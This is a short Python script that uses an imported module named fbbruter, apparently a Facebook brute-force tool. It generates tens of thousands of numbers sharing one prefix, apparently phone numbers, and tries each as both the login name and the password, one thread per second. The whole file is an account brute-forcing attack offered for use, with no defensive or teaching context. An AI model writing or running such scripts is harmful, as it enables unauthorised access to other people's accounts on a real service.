from fbbruter import login
from threading import Thread
from time import sleep



code = str(98903)

numbers = [code+str(suffix) for suffix in range(10000,99999)]

for number in numbers:
	t = Thread(target=login, args=(number, number))
	t.start()
	sleep(1)
